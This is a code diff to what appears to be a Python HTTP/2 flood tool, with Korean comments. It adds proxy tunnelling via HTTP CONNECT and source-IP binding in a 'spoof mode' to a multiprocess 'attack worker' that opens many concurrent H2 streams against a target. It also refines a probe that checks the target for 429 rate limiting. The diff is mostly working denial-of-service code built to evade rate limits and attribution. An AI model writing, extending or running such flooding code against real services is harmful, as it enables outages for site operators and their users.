@@ -1866,7 +1866,10 @@ async def memcached_worker(name, url, stats, duration, stop, payload_size=0):
 
 # ── H2 multiprocess: raw socket + h2 frames ─────────────────────
 def _mp_h2_flood(args_tuple):
-    """멀티프로세스 H2 전송 (1개 H2 연결, 배치 요청)"""
+    """멀티프로세스 H2 전송 (1개 H2 연결, 배치 요청)
+    
+    v12.6: 프록시 + 소스 IP 바인딩 지원 추가
+    """
     import time as _time
     import ssl as _ssl
     import socket as _socket
@@ -1874,7 +1877,10 @@ def _mp_h2_flood(args_tuple):
     from h2.connection import H2Connection
     from h2.config import H2Configuration
     from h2.events import DataReceived
-    host, port, path, duration, streams = args_tuple
+    host, port, path, duration, streams = args_tuple[:5]
+    # v12.6: optional args
+    src_ip = args_tuple[5] if len(args_tuple) > 5 else None
+    proxy = args_tuple[6] if len(args_tuple) > 6 else None
     sent = 0
     errors = 0
     h2_429 = 0
@@ -1886,7 +1892,37 @@ def _mp_h2_flood(args_tuple):
         raw = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
         raw.settimeout(5.0)
         raw.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
-        raw.connect((host, port))
+        raw.setsockopt(_socket.SOL_SOCKET, _socket.SO_REUSEADDR, 1)
+        
+        # v12.6: 프록시 지원
+        proxy = _PROXY[0]
+        if proxy:
+            from urllib.parse import urlparse as _up
+            p = _up(proxy)
+            p_host = p.hostname
+            p_port = p.port or 8080
+            raw.connect((p_host, p_port))
+            # HTTP CONNECT
+            connect_req = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n"
+            raw.sendall(connect_req.encode())
+            resp = b""
+            while b"\r\n\r\n" not in resp:
+                chunk = raw.recv(4096)
+                if not chunk:
+                    break
+                resp += chunk
+            if b"200" not in resp.split(b"\r\n")[0]:
+                raw.close()
+                return 0, 1
+        else:
+            # v12.6: 소스 IP 바인딩
+            if src_ip:
+                try:
+                    raw.bind((src_ip, 0))
+                except OSError:
+                    pass
+            raw.connect((host, port))
+        
         ssock = ctx.wrap_socket(raw, server_hostname=host)
         
         # h2 connection
@@ -1963,14 +1999,22 @@ def _mp_h2_flood(args_tuple):
     return sent, errors, h2_429
 
 async def h2mp_worker(name, url, stats, duration, stop, payload_size=1024):
-    """HTTP/2 멀티프로세스 공격 워커: N개 프로세스, 각각 1개 H2 연결"""
+    """HTTP/2 멀티프로세스 공격 워커: N개 프로세스, 각각 1개 H2 연결
+    
+    v12.6: 소스 IP 바인딩 + 프록시 지원
+    """
     host, port, path = parse_http(url)
     n_procs = max(1, min(16, _UDP_NPROCS[0]))
     # Each process: 100 concurrent streams
     streams = 100
     import multiprocessing as mp
     ctx = mp.get_context('spawn')
-    targets = [(host, port, path, duration, streams)] * n_procs
+    # v12.6: 각 프로세스에 소스 IP + 프록시 전달
+    proxy = _PROXY[0]
+    targets = []
+    for i in range(n_procs):
+        src_ip = _get_src_ip(i, n_procs) if _SPOOF_MODE[0] and _SRC_IPS[0] else None
+        targets.append((host, port, path, duration, streams, src_ip, proxy))
     pool = ctx.Pool(n_procs)
     async_result = pool.map_async(_mp_h2_flood, targets)
     results = await _wait_pool(pool, async_result, duration + 15)
@@ -3449,21 +3493,33 @@ examples:
             import socket as _sock
             import ssl as _ssl
             for i in range(10):
-                s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
-                s.settimeout(2.0)
-                s.connect((host, port))
+                raw = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
+                raw.settimeout(2.0)
+                raw.connect((host, port))
+                s = raw
                 if scheme == 'https':
                     ctx = _ssl.create_default_context()
                     ctx.check_hostname = False
                     ctx.verify_mode = _ssl.CERT_NONE
-                    s = ctx.wrap_socket(s, server_hostname=host)
-                req = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
-                s.sendall(req.encode())
-                resp = s.recv(4096).decode()
-                if '429' in resp.split('\r\n')[0]:
-                    rate_limit_detected = True
-                    break
-                s.close()
+                    s = ctx.wrap_socket(raw, server_hostname=host)
+                try:
+                    req = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
+                    s.sendall(req.encode())
+                    resp = s.recv(4096).decode(errors='ignore')
+                    # v12.2: Check only the status line for 429
+                    status_line = resp.split('\r\n')[0] if resp else ''
+                    if ' 429 ' in status_line or status_line.endswith(' 429'):
+                        rate_limit_detected = True
+                        break
+                finally:
+                    try:
+                        s.close()
+                    except Exception:
+                        pass
+                    try:
+                        raw.close()
+                    except Exception:
+                        pass
         except Exception:
             pass
         print(f"[auto-full] rate limit: {'YES' if rate_limit_detected else 'NO'}", file=sys.stderr)
